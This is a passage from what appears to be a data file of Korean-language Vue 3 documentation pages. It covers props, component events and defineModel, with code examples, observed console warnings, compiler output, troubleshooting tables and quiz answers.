        body: "선언: defineProps(['foo', 'bar']) / defineProps({ title: String, likes: Number }) / defineProps<{ title?: string; likes?: number }>(). 3.5+ 반응형 구조 분해: const { foo } = defineProps(['foo'])는 컴파일러가 props.foo로 바꿔 반응성을 유지합니다('3.5 전에는 foo가 상수라 바뀌지 않음'). 기본값은 const { foo = 'hello' } = defineProps<…>(). 주의: 'watch(foo, …)처럼 구조 분해한 prop을 값으로 넘기면 안 됨. watch(() => foo, …) getter로. 컴파일러가 잡아 경고'. 이름: 선언은 camelCase, 템플릿은 kebab-case(<MyComponent greeting-message=\"hello\" />). 정적 vs 동적: title=\"x\"는 문자열, :likes=\"42\" :is-published=\"false\" :author=\"{ name }\"처럼 비문자열은 v-bind. v-bind=\"post\"는 객체의 프로퍼티를 각각 prop으로. 단방향: '모든 props는 부모 → 자식 단방향. 자식이 바꾸면 경고'. 바꾸고 싶으면 로컬 ref에 복사(초깃값으로) 또는 computed로 변환. 객체·배열 prop은 참조라 안쪽 변경은 되지만 '긴밀히 결합된 경우가 아니면 피하고 emit'. 검증: { type, required, default(객체·배열은 팩토리), validator(value, props) }. '검증은 인스턴스 생성 전이라 default·validator에서 data·computed 접근 불가'. type: String Number Boolean Array Object Date Function Symbol Error 또는 생성자, [String, null]. 실패하면 개발 모드 콘솔 경고. Boolean 캐스팅: 없으면 false, <X disabled />면 true, default: undefined로 끄기, [Boolean, Number]·[Boolean, String]·[Number, Boolean]은 true, [String, Boolean]은 ''.",
        code: "<script setup lang=\"ts\">\n// 3.5+ 반응형 구조 분해 · 기본값\nconst { title, likes = 0, author } = defineProps<{ title: string; likes?: number; author: { name: string } }>()\nwatch(() => likes, (v) => …)      // getter 로 — watch(likes) 는 컴파일 에러\n\n// 런타임 검증\nconst props = defineProps({\n  size: { type: String, validator: (v, props) => ['s', 'm'].includes(v) },   // 3.4+ 둘째 인자\n  count: { type: Number, default: 0 },\n  tags: { type: Array, default: () => [] },                                    // 객체·배열은 팩토리\n  required: { type: String, required: true },\n  nullable: { type: [String, null] },\n  flag: Boolean,                                                               // <X flag /> → true · 없으면 false\n})\n// props.count = 1   ✗ warn: Set operation on key \"count\" failed: target is readonly.\nconst local = ref(props.count)                 // 초깃값으로 복사\nconst normalized = computed(() => props.size.trim().toLowerCase())   // 변환\n</script>\n\n<!-- 부모 -->\n<Comp title=\"정적 문자열\" :likes=\"42\" :is-published=\"false\" :author=\"{ name: 'x' }\" v-bind=\"post\" flag />",
        terms: [
          {
            term: "반응형 Props 구조 분해 (3.5+)",
            body: "const { msg } = defineProps(…)를 써도 템플릿·watch getter·computed에서 msg가 바뀌면 따라오는 기능입니다. 컴파일러가 msg를 __props.msg로 치환하기 때문입니다(실제로 compileScript 출력에서 _toDisplayString(__props.msg), watch(() => __props.count)). 기본값은 구조 분해의 = 로 적고 컴파일러가 props 선언의 default로 옮깁니다(실제로 msg: { type: String, required: false, default: 'hi' }). 함정 하나: 구조 분해한 변수를 watch나 컴포저블에 '값'으로 넘기면 그 순간의 값이 복사되므로 컴파일러가 에러를 냅니다('\"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.').",
          },
          {
            term: "Boolean 캐스팅",
            body: "HTML의 불리언 속성 규칙을 prop에 적용하는 것입니다. type에 Boolean이 있으면 <X disabled />처럼 값 없는 속성은 true, 속성이 없으면 false(undefined가 아님). 여러 타입이면 순서가 중요합니다. Boolean이 String보다 앞이면 ''를 true로, String이 앞이면 ''는 빈 문자열입니다. 실제로 돌려 보면 c: [String, Boolean]에 <Flags c />는 \"\", d: [Boolean, String]은 true였습니다. default: undefined로 캐스팅을 끌 수 있습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 size(validator), count(Number), required(required)를 선언한 컴포넌트에 size=\"xl\", count=\"3\"(문자열)을 주고 required를 빼니 경고 셋: 'Invalid prop: custom validator check failed for prop \"size\".', 'Invalid prop: type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\".', 'Missing required prop: \"required\"'. 렌더는 됐습니다. Chrome에서 자식이 props.x = 2를 하니 '[Vue warn] Set operation on key \"x\" failed: target is readonly.'이고 값은 그대로, props.o.a = 2(객체 안)는 경고 없이 부모의 o.a가 2가 됐습니다. Boolean 캐스팅 <Flags a c d /> with { a: Boolean, b: Boolean, c: [String, Boolean], d: [Boolean, String] }는 'true false \"\" true'. compileScript로 const { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>()를 컴파일하니 props: { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }가 되고 템플릿의 msg는 __props.msg, watch(() => count)는 watch(() => __props.count)로 바뀌었습니다. watch(count, …)처럼 구조 분해 변수를 직접 넘기니 컴파일 에러 '[@vue/compiler-sfc] \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.' defineProps 안에서 로컬 변수 def를 default로 참조하는 코드는 3.5.45 compileScript가 통과시켰습니다(문서는 매크로 인자가 모듈 스코프로 끌어올려져 로컬 변수를 참조할 수 없다고 적음. inlineTemplate 여부 등 설정에 따라 다를 수 있음).",
        code: "// Node — 검증 경고 (vue 3.5.45)\n[Vue warn]: Invalid prop: custom validator check failed for prop \"size\".\n[Vue warn]: Invalid prop: type check failed for prop \"count\". Expected Number with value 3, got String with value \"3\".\n[Vue warn]: Missing required prop: \"required\"\n\n// Chrome — 단방향\nprops.x = 2    → [Vue warn] Set operation on key \"x\" failed: target is readonly.  (값 그대로)\nprops.o.a = 2  → 경고 없음 · 부모 o.a === 2\n<Flags a c d /> { a: Boolean, b: Boolean, c: [String, Boolean], d: [Boolean, String] } → true false \"\" true\n\n// compileScript — 3.5 구조 분해\nconst { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>()\n→ props: { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }\n→ 템플릿 msg → __props.msg · watch(() => count) → watch(() => __props.count)\nwatch(count, …) → error: \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.",
      },
      {
        label: "문제: 자식에서 토글한 값이 부모에서 되돌아온다",
        body: "<Toggle :on=\"isOn\" />에서 자식이 버튼 클릭에 props.on = !props.on을 했습니다. 경고 'Set operation on key \"on\" failed: target is readonly.'와 함께 바뀌지 않습니다(실제로 확인). props는 부모의 상태가 내려온 읽기 전용 스냅샷이고, 자식이 바꾸면 부모의 진실과 어긋나 추적이 불가능해지므로 막습니다. 처방은 의도에 따라 셋입니다. 부모가 주인이면 emit('update:on', !props.on)으로 올리고 부모가 바꿉니다(그 짝을 줄인 것이 v-model). 자식이 자기 상태로 쓰되 초깃값만 받으면 const local = ref(props.on). 변환해서 쓰면 computed(() => …). 객체 prop의 안을 고치는 것은 경고가 없지만(실제로 부모까지 바뀜) 같은 이유로 피하고 emit합니다.",
      },
      {
        label: "문제가 나는 경우: 선언과 방향을 어길 때",
        body: "경우 ㄱ, props 변경입니다. 위의 사고입니다. 경우 ㄴ, 객체 prop 안 변경. 조용히 부모 변경(실제로). emit. 경우 ㄷ, 정적 속성으로 숫자·불리언. 문자열. type check 경고(실제로). v-bind. 경우 ㄹ, 객체·배열 default를 값으로. 인스턴스 간 공유. 팩토리 함수. 경우 ㅁ, default·validator에서 this·다른 상태 접근. 인스턴스 생성 전. 둘째 인자 props만. 경우 ㅂ, Boolean 타입 순서. [String, Boolean]에 빈 속성이 ''. 순서 조정. 경우 ㅅ, 3.5 전에 구조 분해. 상수가 되어 안 바뀜. props.x 또는 toRefs. 경우 ㅇ, 3.5 구조 분해 변수를 watch·컴포저블에 값으로. 컴파일 에러(실제로). getter. 경우 ㅈ, 타입 전용 선언과 런타임 선언 동시. 컴파일 에러. 하나만. 경우 ㅊ, 템플릿에서 camelCase prop. SFC는 되지만 in-DOM은 소문자. kebab. 경우 ㅋ, required 없이 undefined 기본값 기대. 없으면 undefined(Boolean 제외). required 또는 default. 경우 ㅌ, 운영에서 검증 경고 기대. 개발 모드만. 경우 ㅍ, 미선언 속성이 props에 올 거라 기대. 폴스루로 루트에 감(폴스루 노드).",
        code: "경우               언제 생기나                        겉모습                                              처방\nㄱ props 변경       props.on = !props.on               Set operation on key \"on\" failed: target is readonly.   emit · 로컬 ref · computed\nㄴ 객체 안 변경      props.user.name = x                부모까지 조용히                                      emit\nㄷ 정적 비문자열     count=\"3\"                          '3' · type check failed 경고                          :count=\"3\"\nㄹ 공유 default     default: []                        인스턴스 간 공유                                     default: () => []\nㅁ default 에서 상태  default() { return this.x }        접근 불가                                           (value, props)\nㅂ Boolean 순서     [String, Boolean] + <X c>            ''                                                [Boolean, String]\nㅅ 3.5 전 구조 분해   const { x } = defineProps          상수                                               props.x · toRefs\nㅇ 구조 분해 값 전달   watch(count)                       compile error (실제로)                               watch(() => count)\nㅈ 두 선언 동시      defineProps<T>({…})                 컴파일 에러                                         하나\nㅊ in-DOM camel     greetingMessage=\"x\"                 소문자                                              greeting-message\nㅋ 기본값 기대       선언만                              undefined                                          default\nㅌ 운영 경고 기대     production                         경고 없음                                           개발에서 잡기\nㅍ 미선언 속성       props 에 없음                        폴스루                                              선언",
        codeLang: "text",
      },
      {
        label: "문제의 구조: props 는 '부모 상태의 읽기 전용 투영' 이고, 선언은 그 투영의 모양을 검사한다",
        body: "props는 부모 상태가 자식으로 투영된 읽기 전용 스냅샷입니다. 그래서 자식이 쓰면 막히고(ㄱ), 참조 안쪽은 투영이 아니라 공유라 막히지 않지만 같은 이유로 피해야 합니다(ㄴ). 선언은 투영의 '모양'(타입·필수·검증·기본값)을 적는 것이고 개발 모드에서 검사됩니다(ㄷ, ㅌ). 모양을 적는 자리는 인스턴스 전이라 인스턴스를 못 봅니다(ㅁ, ㄹ). Boolean은 HTML 속성 규칙이 섞여 순서가 뜻을 바꿉니다(ㅂ). 3.5의 구조 분해는 투영을 지역 변수처럼 쓰게 하되, 컴파일러가 치환하는 것이라 '값으로 넘기는' 자리는 치환이 미치지 못해 막습니다(ㅇ). 처방은 props를 '받아 읽는 것'으로만 쓰고, 바꿀 것은 emit으로 주인에게 돌려보내고, 모양은 선언으로 적는 것입니다.",
        code: "부모 상태 ──투영 (읽기 전용)──▶ props   쓰기 → 막힘 (ㄱ) · 참조 안쪽 = 공유, 안 막힘 (ㄴ)\n선언 = 투영의 모양:  type · required · default(팩토리 ㄹ) · validator(value, props ㅁ)  → 개발 모드 검사 (ㄷ ㅌ) · Boolean 은 HTML 규칙 (ㅂ)\n3.5 구조 분해 = 컴파일러 치환 (__props.x) → 값으로 넘기면 치환 밖 → 에러 (ㅇ)\n\nprops: 읽기만 · 바꿀 것은 emit · 모양은 선언",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식에서 부모로 가는 길이 다음 페이지 '컴포넌트 이벤트'입니다. 실제로 돌려 보면 emits에 click을 선언한 자식은 네이티브 click을 폴스루하지 않고 emit만 전달했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <Pagination :page=\"3\" total=\"120\" />에서 자식이 total / 10을 계산하니 12가 나오지만 타입 경고가 뜹니다. 왜? (2) <Modal open />과 <Modal :open=\"false\" />를 둘 다 지원하고, open이 없으면 닫힘이어야 합니다. 선언은? (3) 3.5에서 const { items } = defineProps<{ items: Item[] }>()를 useFilter(items)에 넘겼더니 필터가 갱신되지 않습니다. 왜고 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) total=\"120\"은 정적 속성이라 문자열 '120'입니다. '120' / 10은 JS가 숫자로 바꿔 12지만, total: Number로 선언했으면 'type check failed for prop \"total\". Expected Number with value 120, got String with value \"120\"' 경고가 납니다(실제로 같은 문구 확인). :total=\"120\"으로 바인딩합니다. (2) open: Boolean 하나면 됩니다. Boolean 캐스팅으로 <Modal open />은 true, :open=\"false\"는 false, 속성이 없으면 false(undefined 아님. 실제로 b가 false). 문자열 'false'를 받을 일이 있으면 [Boolean, String] 순서로 두되 ''는 true가 됩니다. (3) 구조 분해한 items는 컴파일러가 __props.items로 치환하지만, 함수 인자로 '값'으로 넘기면 그 순간의 배열이 넘어가 이후 변경을 모릅니다. watch에 넘기면 컴파일 에러로 잡히지만(실제로 확인) 보통 함수 호출은 잡히지 않을 수 있습니다. useFilter(() => items)처럼 getter로 넘기고 컴포저블 안에서 toValue(source)로 읽습니다(컴포저블 노드의 관례). 또는 const props = defineProps(…)로 받아 useFilter(() => props.items).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Props", href: `${DOCS}/guide/components/props` },
      { label: "defineProps", href: `${DOCS}/api/sfc-script-setup#defineprops-defineemits` },
      { label: "TypeScript with Composition API — Typing Props", href: `${DOCS}/guide/typescript/composition-api#typing-component-props` },
    ],
  },

  {
    id: "vg-comp-events",
    name: "컴포넌트 이벤트",
    tagline: "emit 으로 올리고 emits 로 선언한다 — 선언이 네이티브 리스너와의 경계를 정한다",
    intro:
      "컴포넌트 심화 셋째 페이지입니다. 자식이 부모에게 '일어난 일'을 알리는 길은 emit입니다. 템플릿에서 $emit('someEvent'), <script setup>에서 const emit = defineEmits(['inFocus', 'submit']); emit('submit', payload). 부모는 @some-event로 듣고(.once 가능), 인자는 그대로 전달됩니다. 이름은 camelCase로 내고 kebab-case로 듣습니다. '컴포넌트 이벤트는 버블링하지 않는다'. 선언: defineEmits 배열, 또는 객체로 페이로드 검증(true/false 반환), TS는 호출 시그니처나 3.3+ 명명 튜플. 주의: 'emits에 네이티브 이벤트(click)를 선언하면 리스너는 컴포넌트가 emit한 click만 듣는다'. 선언하지 않은 리스너는 폴스루로 루트 요소의 네이티브 리스너가 됩니다. 실제로 돌려 보면 emits: ['click']인 자식의 @click은 emit('click', 'from child')만 받고 네이티브 click은 오지 않았으며, 선언 없는 자식의 @click은 네이티브 click이 루트로 폴스루되어 울렸습니다. 이 노드의 질문은 하나입니다. 이 리스너는 컴포넌트 이벤트인가 네이티브인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "내기: 템플릿 <button @click=\"$emit('someEvent')\">, Options this.$emit, <script setup> const emit = defineEmits(['inFocus', 'submit']) 뒤 emit('submit'). 'defineEmits 매크로는 함수 안에서 쓸 수 없다'(최상위). 듣기: <MyComponent @some-event=\"callback\" />. .once 지원. 인자: $emit('increaseBy', 1)이면 @increase-by=\"(n) => count += n\" 또는 메서드의 첫 인자. 여러 인자 전달 가능. 이름: emit은 camelCase, 템플릿 리스너는 kebab-case(Vue가 변환). '컴포넌트 이벤트는 네이티브 DOM 이벤트와 달리 버블링하지 않는다. 형제·먼 자손은 외부 이벤트 버스나 전역 상태로'. 선언: defineEmits(['a', 'b']) 또는 객체 { submit: ({ email, password }) => { /* 검증 */ return true/false } }. 검증 함수는 emit의 인자를 받아 불리언. 실패하면 경고. TS: defineEmits<{ (e: 'change', id: number): void }>() 또는 3.3+ defineEmits<{ change: [id: number]; update: [value: string] }>(). 보통 <script>에서는 emits 옵션과 setup(props, { emit }). 폴스루와의 관계(팁): '네이티브 이벤트(click)를 emits에 선언하면 리스너는 컴포넌트가 emit한 click만 듣고, 루트 요소의 네이티브 click에는 반응하지 않는다'. 선언은 '알려진 리스너'를 $attrs에서 빼는 효과입니다.",
        code: "<!-- Child.vue -->\n<script setup lang=\"ts\">\n// 선언 — 배열 · 객체(검증) · TS 명명 튜플 (3.3+)\nconst emit = defineEmits<{ change: [id: number]; submit: [payload: { email: string }] }>()\n// const emit = defineEmits({ submit: (p) => { if (p.email && p.password) return true; console.warn('Invalid submit event payload!'); return false } })\n\nfunction onClick() { emit('change', 1) }\n</script>\n<template>\n  <button @click=\"onClick\">go</button>\n  <button @click=\"$emit('submit', { email })\">submit</button>   <!-- 템플릿에서 직접 -->\n</template>\n\n<!-- Parent -->\n<Child @change=\"(id) => select(id)\" @submit.once=\"onSubmit\" />   <!-- kebab 으로 듣기 · .once -->\n\n// 보통 <script>\nexport default { emits: ['change'], setup(props, { emit }) { emit('change', 1) } }\n\n// emits 선언과 네이티브\n<Btn @click=\"f\" />   Btn 이 emits: ['click'] → 컴포넌트 click 만 · 선언 없음 → 루트 <button> 의 네이티브 click 폴스루",
        terms: [
          {
            term: "emits 선언과 폴스루",
            body: "컴포넌트가 받은 리스너(@click)는 선언된 이벤트면 '컴포넌트 이벤트 리스너'로 emit을 기다리고, 선언되지 않았으면 '모르는 속성'이라 폴스루로 루트 요소에 네이티브 리스너로 붙습니다. 그래서 선언 없이 @click을 걸면 루트 요소의 클릭이 바로 울리고, emit('click')도 하면 두 번 울립니다. 선언하면 네이티브는 끊기고 emit만 옵니다(실제로 확인). 래퍼 버튼이 click을 그대로 노출하려면 선언하지 않고 폴스루에 맡기거나, 선언하고 안에서 @click=\"$emit('click', $event)\"로 중계합니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 emits: ['click']을 선언하고 루트 <button @click=\"$emit('click', 'from child')\">인 Btn과, 선언 없는 루트 <button>인 Raw를 두고 둘 다 부모에서 @click을 걸었습니다. Btn의 버튼을 클릭하니 로그는 ['Btn: from child'] 하나(emit의 인자). 네이티브 click은 오지 않았습니다. Raw의 버튼을 클릭하니 ['Raw: click']으로 네이티브 MouseEvent가 폴스루로 왔습니다. 루트가 둘인 컴포넌트에 @click을 걸면 '[Vue warn]: Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes. If the listener is intended to be a component custom event listener only, declare it using the \"emits\" option.' Node에서 h(Btn, { onGo, onOther })처럼 리스너를 넘기고 emits: ['go']만 선언하니 onOther는 attrs에 남았습니다(폴스루 대상). 컴파일 출력에서 <Comp @update:title.once=\"f\">는 \"onUpdate:titleOnce\": _ctx.f로, 수식어가 이벤트 이름에 붙어 컴포넌트에 전달됩니다. compileScript에서 defineEmits<{ change: [id: number] }>()는 emits: [\"change\"]로, defineModel과 함께면 _mergeModels([\"change\"], [\"update:modelValue\"])로 합쳐졌습니다.",
        code: "// Chrome 156\nBtn { emits: ['click'], 루트 <button @click=\"$emit('click', 'from child')\"> } · 부모 @click\n  → ['Btn: from child']   (네이티브 click 안 옴)\nRaw { 루트 <button> } · 부모 @click\n  → ['Raw: click']        (네이티브 MouseEvent 폴스루)\nMulti (루트 둘) · 부모 @click\n  → warn: Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes. If the listener is intended to be a component custom event listener only, declare it using the \"emits\" option.\n\n// 컴파일\n<Comp @update:title.once=\"f\">  → \"onUpdate:titleOnce\": _ctx.f\ndefineEmits<{ change: [id: number] }>() + defineModel  → emits: _mergeModels([\"change\"], [\"update:modelValue\"])",
      },
      {
        label: "문제: 래퍼 버튼의 @click 이 두 번 울린다",
        body: "<BaseButton @click=\"save\" />. BaseButton 템플릿은 <button @click=\"$emit('click', $event)\">입니다. save가 두 번 불립니다. emits를 선언하지 않았기 때문입니다. 부모의 @click은 '모르는 리스너'라 루트 <button>에 네이티브로 폴스루되어 한 번, 자식의 $emit('click')으로 또 한 번. 실제로 돌려 보면 선언 없는 컴포넌트의 @click은 네이티브로 왔습니다. 처방은 둘 중 하나입니다. defineEmits(['click'])을 선언하면 네이티브 폴스루가 끊기고 emit만 옵니다(실제로 확인). 또는 emit을 빼고 폴스루에 맡깁니다. 그러면 네이티브 MouseEvent가 그대로 옵니다. 단, 루트가 하나여야 폴스루가 됩니다. 루트가 둘이면 'Extraneous non-emits event listeners' 경고와 함께 버려집니다.",
      },
      {
        label: "문제가 나는 경우: 선언과 전파를 모를 때",
        body: "경우 ㄱ, 두 번 울림입니다. 위의 사고입니다. 경우 ㄴ, 선언했는데 네이티브 click을 기대. 끊김(실제로). 선언 제거 또는 중계. 경우 ㄷ, 버블링 기대. 손자 emit을 조부모가 못 들음. 단계별 emit, provide된 함수, 스토어. 경우 ㄹ, 이름 케이스. emit('fooBar') / @foo-bar는 Vue가 맞춰 주지만, emit('foo-bar')와 @fooBar는 안 맞음. camelCase emit, kebab 듣기. 경우 ㅁ, defineEmits를 함수 안에서. 컴파일 에러. 최상위. 경우 ㅂ, 검증 함수가 false를 돌려줘도 이벤트가 막힐 거라 기대. 경고만, 이벤트는 전달. 경우 ㅅ, 다중 루트에 리스너. 경고·버려짐(실제로). 루트 하나 또는 v-bind=\"$attrs\". 경우 ㅇ, .native 수식어(Vue 2). 3에서 제거. 폴스루가 대신. 경우 ㅈ, emit 뒤 바로 부모 상태를 읽음. 동기로 핸들러가 돌지만 DOM은 다음 틱. 경우 ㅊ, TS에서 미선언 이벤트 emit. 타입 에러. 선언 추가. 경우 ㅋ, 이벤트로 데이터를 '내려'보내려 함. 방향 반대. props. 경우 ㅌ, 인자 여럿을 배열로 받길 기대. 각각 인자로 옴. (a, b) =>.",
        code: "경우               언제 생기나                       겉모습                                 처방\nㄱ 두 번 울림       미선언 + $emit('click')             네이티브 + emit                        emits 선언 · 또는 emit 제거\nㄴ 네이티브 기대     emits: ['click'] 선언               네이티브 안 옴 (실제로)                  선언 제거 · $emit('click', $event)\nㄷ 버블링 기대       손자 → 조부모                       안 들림                                단계 emit · provide fn · 스토어\nㄹ 케이스 불일치     emit('foo-bar') + @fooBar           안 맞음                                camel emit · kebab 듣기\nㅁ 함수 안 매크로    if (x) defineEmits()                컴파일 에러                             최상위\nㅂ 검증으로 차단 기대  validator false                    경고만 · 전달됨                         핸들러에서 검사\nㅅ 다중 루트 리스너   루트 둘 + @click                    Extraneous non-emits event listeners     루트 하나 · $attrs\nㅇ .native          @click.native                      Vue 3 제거                             폴스루\nㅈ emit 뒤 DOM      핸들러 뒤 바로 측정                   옛 DOM                                nextTick\nㅊ TS 미선언        emit('nope')                       타입 에러                               선언\nㅋ 역방향           emit 으로 내려보냄                   설계 반대                               props\nㅌ 인자 배열 기대    emit('x', a, b) → ([a, b]) =>        각각 옴                                (a, b) =>",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 리스너는 '선언 여부' 로 컴포넌트 이벤트와 네이티브로 갈리고, 컴포넌트 이벤트는 한 단계만 간다",
        body: "부모가 컴포넌트에 건 @x는 한 가지 리스너지만 Vue는 둘 중 하나로 해석합니다. emits에 x가 있으면 컴포넌트 이벤트 리스너(emit('x')를 기다림), 없으면 모르는 속성이라 폴스루로 루트 요소의 네이티브 리스너(ㄱ, ㄴ). 폴스루는 단일 루트에만 자리가 있어 다중 루트면 버려집니다(ㅅ). 컴포넌트 이벤트는 DOM 이벤트가 아니라 부모가 넘긴 함수를 자식이 부르는 것이라 전파가 없고(ㄷ), 이름은 Vue가 camel↔kebab을 맞춰 주되 한 방향만(ㄹ), 인자는 함수 인자 그대로입니다(ㅌ). 검증은 경고용이라 막지 않습니다(ㅂ). 처방은 컴포넌트가 내는 이벤트는 전부 선언하고(그러면 같은 이름의 네이티브는 끊긴다는 것을 알고), 네이티브를 그대로 노출할 것은 선언하지 않고 폴스루에 맡기는 것입니다.",
        code: "부모 @x=\"fn\" ──▶ 자식\n  emits 에 x 있음 → 컴포넌트 이벤트 리스너 → emit('x', ...args) 가 fn(...args) 호출 (전파 없음 ㄷ · 인자 그대로 ㅌ · 검증은 경고 ㅂ)\n  emits 에 x 없음 → 폴스루 → 단일 루트 요소의 addEventListener('x') (다중 루트면 버려짐 ㅅ)\n\n선언 = 경계: 선언하면 네이티브 끊김 (ㄴ) · 안 하면 네이티브 + emit 겹침 (ㄱ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "props 내리기와 emit 올리기를 한 쌍으로 묶은 것이 다음 페이지 '컴포넌트 v-model'입니다. 실제로 돌려 보면 defineModel은 modelValue prop + update:modelValue 이벤트 + useModel 호출로 컴파일됐습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <SearchInput>이 입력마다 'search' 이벤트를 내고 부모가 @search로 받습니다. 자식 코드는? (2) 디자인 시스템의 <DsButton>은 click·focus·blur를 전부 네이티브처럼 노출해야 합니다. emits를 선언할까요? (3) 깊은 자손 <Row>가 선택되면 최상위 <Table>이 알아야 합니다. 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) const emit = defineEmits<{ search: [query: string] }>()를 최상위에 선언하고 <input @input=\"emit('search', $event.target.value)\">. 부모는 @search=\"(q) => run(q)\". 인자는 그대로 함수 인자로 옵니다. 디바운스가 필요하면 자식 안에서 하거나 customRef를. (2) 선언하지 않습니다. 선언하면 같은 이름의 네이티브 리스너가 끊기고(실제로 확인) emit으로 일일이 중계해야 합니다. 루트를 <button> 하나로 두면 click·focus·blur가 폴스루로 네이티브 리스너가 되어 MouseEvent·FocusEvent가 그대로 옵니다. 루트가 하나여야 하고, inheritAttrs: false를 켰다면 <button v-bind=\"$attrs\">로 넘깁니다. 컴포넌트 고유 이벤트(예: 'long-press')만 선언합니다. (3) 컴포넌트 이벤트는 버블링하지 않으니 Row → Section → Table로 단계마다 emit하거나, Table이 provide('onSelect', fn)으로 함수를 내려 Row가 inject해 부르거나, 선택 상태를 스토어(Pinia)에 두고 Row가 바꾸게 합니다. 중간 단계가 적으면 단계 emit, 많으면 provide/inject가 문서의 길입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Component Events", href: `${DOCS}/guide/components/events` },
      { label: "emits (Options: State)", href: `${DOCS}/api/options-state#emits` },
      { label: "Fallthrough Attributes — v-on Listener Inheritance", href: `${DOCS}/guide/components/attrs#v-on-listener-inheritance` },
    ],
  },

  {
    id: "vg-comp-vmodel",
    name: "컴포넌트 v-model",
    tagline: "defineModel 하나가 modelValue prop 과 update:modelValue 이벤트가 된다",
    intro:
      "컴포넌트 심화 넷째 페이지입니다. 네이티브 요소의 v-model이 value/input 짝이라면 컴포넌트의 v-model은 modelValue prop과 update:modelValue 이벤트 짝입니다. 3.4+의 defineModel()은 그 짝을 선언하고 양방향으로 동기화되는 ref를 돌려줍니다. model.value를 읽으면 부모 값, 쓰면 update 이벤트가 나갑니다. 인자 v-model:title은 defineModel('title'), 여럿도 됩니다. 수식어는 const [model, modifiers] = defineModel()로 받고 get/set 변환도 됩니다. 주의: defineModel에 default를 주고 부모가 undefined를 넘기면 '부모와 자식이 어긋날 수 있다'. 실제로 돌려 보면 compileScript가 defineModel<string>({ required: true })을 props의 \"modelValue\": { type: String, ...{ required: true } }와 \"modelModifiers\": {}, emits의 \"update:modelValue\", 그리고 const model = _useModel(__props, \"modelValue\")로 바꿨습니다. 템플릿 컴파일에서 <Comp v-model:title=\"t\">는 title prop과 \"onUpdate:title\": $event => (t = $event)였고, prop에 v-model을 걸면 'v-model cannot be used on a prop, because local prop bindings are not writable…' 컴파일 에러였습니다. 이 노드의 질문은 하나입니다. v-model은 어떤 prop과 이벤트로 풀리나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "3.4+: <script setup> const model = defineModel(); 템플릿 <input v-model=\"model\" />. 부모 <Child v-model=\"countModel\" />. 'defineModel의 반환값은 부모의 v-model 값과 양방향으로 동기화되는 ref'. 내부적으로 modelValue prop과 update:modelValue 이벤트를 선언합니다. 3.4 전: const props = defineProps(['modelValue']); const emit = defineEmits(['update:modelValue']); <input :value=\"modelValue\" @input=\"emit('update:modelValue', $event.target.value)\">. 옵션: defineModel({ required: true }), defineModel({ default: 0 }). 주의(경고): 'default가 있고 부모가 값을 안 주면 부모는 undefined, 자식은 default라 어긋날 수 있다'. 인자: <MyComponent v-model:title=\"bookTitle\" />은 defineModel('title')(prop title + update:title). 여럿: v-model:first-name과 v-model:last-name은 defineModel('firstName'), defineModel('lastName'). 수식어: <MyComponent v-model.capitalize=\"text\" />는 const [model, modifiers] = defineModel()에서 modifiers.capitalize가 true. 변환은 defineModel({ set(value) { return modifiers.capitalize ? value.charAt(0).toUpperCase() + value.slice(1) : value } }). 인자가 있으면 수식어 prop 이름은 arg + 'Modifiers'(titleModifiers). <component :is>에 v-model은 modelValue 짝으로 확장되어 네이티브 요소에는 안 됩니다.",
        code: "<!-- Child.vue — 3.4+ -->\n<script setup lang=\"ts\">\nconst model = defineModel<string>({ required: true })          // modelValue + update:modelValue\nconst title = defineModel<string>('title', { default: '' })      // v-model:title → title + update:title\nconst [text, modifiers] = defineModel<string>('text', {\n  set(v) { return modifiers.capitalize ? v.charAt(0).toUpperCase() + v.slice(1) : v },\n})\n</script>\n<template>\n  <input v-model=\"model\" />        <!-- ref 라 바로 바인딩 -->\n  <input v-model=\"title\" />\n  <input v-model=\"text\" />\n</template>\n\n<!-- Parent -->\n<Child v-model=\"name\" v-model:title=\"bookTitle\" v-model:text.capitalize=\"memo\" />\n\n<!-- 3.4 전 — 손으로 -->\n<script setup>\nconst props = defineProps(['modelValue']); const emit = defineEmits(['update:modelValue'])\n</script>\n<input :value=\"modelValue\" @input=\"emit('update:modelValue', $event.target.value)\" />",
        terms: [
          {
            term: "defineModel (3.4+)",
            body: "<script setup>의 컴파일러 매크로로, v-model 계약(prop + update 이벤트)을 한 줄로 선언하고 그 둘을 묶은 ref를 돌려줍니다. 실제로 컴파일 출력은 props에 modelValue와 modelModifiers, emits에 update:modelValue를 추가하고 const model = useModel(__props, 'modelValue')였습니다. useModel은 런타임 헬퍼로, 읽기는 props를 보고 쓰기는 emit을 부릅니다. 부모가 v-model을 안 걸었으면 자식 안에서 로컬 ref처럼 동작합니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
